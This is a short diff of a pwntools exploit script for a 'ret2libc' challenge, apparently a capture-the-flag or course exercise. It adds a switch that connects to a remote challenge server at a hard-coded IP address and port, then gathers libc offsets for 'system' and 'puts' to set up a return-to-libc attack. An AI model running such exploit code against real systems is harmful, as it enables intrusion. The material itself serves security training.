@@ -3,8 +3,12 @@ from LibcSearcher import *
 
 ret2libc = ELF('./ret2libc')
 
-sh = process('./ret2libc')
-libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+if args.get('REMOTE'):
+    sh = remote('140.113.209.24', 11002)
+    libc = ELF('./libc.so.6')
+else:
+    sh = process('./ret2libc')
+    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
 system_offset = libc.symbols['system']
 puts_offset = libc.symbols['puts']
